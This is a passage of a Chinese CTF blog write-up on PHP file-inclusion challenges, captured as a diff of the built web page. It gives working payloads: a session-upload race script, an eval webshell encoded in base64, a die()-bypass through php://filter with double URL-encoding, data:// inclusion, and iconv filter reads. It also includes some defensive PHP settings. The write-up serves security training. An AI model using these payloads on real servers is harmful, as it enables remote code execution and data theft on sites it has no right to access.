class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br>    <br>    event.<span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 设置事件（实际未使用）</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>为什么需要多线程？</strong>（<strong>就算先删除临时目录再包含，也可以写进去shell</strong>)</p>
+<ol>
+<li><strong>竞争条件</strong>：Session文件在上传结束后会被PHP清空</li>
+<li>写线程不断创建&#x2F;更新Session文件</li>
+<li>读线程不断尝试在文件被清空前包含它</li>
+<li>多个线程增加成功率（类似不断尝试开锁）</li>
+</ol>
+<hr>
+<h3 id="Webshell使用示例"><a href="#Webshell使用示例" class="headerlink" title="Webshell使用示例"></a>Webshell使用示例</h3><p>成功创建<code>2.php</code>后，攻击者可以发送：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/2.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>目标网站<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-ini"><span class="hljs-attr">2</span>=system(<span class="hljs-string">&quot;ls -la /&quot;</span>)<span class="hljs-comment">;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>结果</strong>：</p>
+<ul>
+<li>服务器会执行<code>ls -la /</code>（列出根目录所有文件）</li>
+<li>返回结果给攻击者</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br>...<br>total 123<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 .<br>drwxr-xr-x  1 root root   4096 Jun 14 12:34 ..<br>-rw-r--r--  1 root root    148 Aug 17  2022 .bashrc<br>...<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="为什么这个攻击有效？"><a href="#为什么这个攻击有效？" class="headerlink" title="为什么这个攻击有效？"></a>为什么这个攻击有效？</h3><ol>
+<li><p><strong>Session文件可控</strong>：</p>
+<ul>
+<li>唯一无需后缀即可写入PHP代码的地方</li>
+<li>通过<code>PHP_SESSION_UPLOAD_PROGRESS</code>控制内容</li>
+</ul>
+</li>
+<li><p><strong>文件包含漏洞</strong>：</p>
+<ul>
+<li>网站有类似<code>include($_GET[&#39;file&#39;])</code>的代码</li>
+<li>允许读取<code>/tmp/sess_xxx</code>文件</li>
+</ul>
+</li>
+<li><p><strong>时间窗口利用</strong>：</p>
+<ul>
+<li>大文件上传延长Session文件存在时间</li>
+<li>多线程不断尝试利用这个时间窗口</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol>
+<li><p>关闭危险功能：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; php.ini 配置</span><br><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>限制文件包含：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不要直接包含用户输入</span><br><span class="hljs-variable">$allowed</span> = [<span class="hljs-string">&#x27;header.php&#x27;</span>, <span class="hljs-string">&#x27;footer.php&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>设置open_basedir：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 限制PHP可访问的目录</span><br><span class="hljs-attr">open_basedir</span> = /var/www/html:/tmp<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>Session文件隔离：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 为每个用户设置独立Session目录</span><br><span class="hljs-attr">session.save_path</span> = <span class="hljs-string">&quot;/var/lib/php/sessions&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>这个攻击利用了PHP的多个特性和配置默认值，通过精心构造的请求在服务器上创建后门。理解每个步骤对于防御此类攻击至关重要。</p>
+<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤</p>
+<p>file_put_contents(urldecode($file), “<?php die(‘大佬别秀了’);?>”.$content);</p>
+<ul>
+<li>使用<code>file_put_contents</code>函数将字符串写入到由<code>$file</code>指定的文件中。在写入之前，<code>$file</code>经过了<code>urldecode</code>函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息”大佬别秀了”。然后是变量<code>$content</code>的值。</li>
+</ul>
+<p>那么 file_put_contents 函数，将会往 $file 里写入 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 和我们 post 传入的 $content 内容。</p>
+<p>这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了</p>
+<p>由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。</p>
+<p>content是写入内容,要进行base64编码  对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;（四个一组））</p>
+<p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p>
+<p>进行二次编码后得到:</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30<br></code></pre></td></tr></table></figure>
+
+<p>对 webshell 进行 base64 编码：</p>
+<p>webshell：<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code></p>
+<p>编码后得到:<br>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</p>
+<p>注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。</p>
+<p>post 传入：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">content</span><span class="hljs-operator">=</span><span class="hljs-number">11</span>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+
+<p>然后调用shell.php，传入cmd</p>
+<p><img src="/%5Cimages%5Cweb87.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; &gt;?<br></code></pre></td></tr></table></figure>
+
+<p>用伪协议：</p>
+<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]</p>
+<p><img src="/%5Cimages%5Cweb88-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>改成base64后没有被过滤的符号的，可以添加echo ‘a’或者&gt;末尾任意添加</p>
+<p><img src="/%5Cimages%5Cweb88-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>即可得到flag</p>
+<h2 id="攻防世界篇"><a href="#攻防世界篇" class="headerlink" title="攻防世界篇"></a>攻防世界篇</h2><h3 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>先试着用伪协议读</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure>
+
+<p>发现过滤了base，encode，convert</p>
+<p>改用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=flag.php</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF%E9%9D%B6%E5%9C%BA/" class="print-no-link">#CTF靶场</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件包含</div>
+      <div>http://maskobito.github.io/2025/01/06/CTF-文件包含/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>MaskObito</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/01/07/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="信息搜集">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">信息搜集</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">
+                        <span class="hidden-mobile">文件包含</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'http://maskobito.github.io/2025/01/06/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/';
+          this.page.identifier = '/2025/01/06/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/typing-effect.js"></script>
+<script src="/js/particle.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
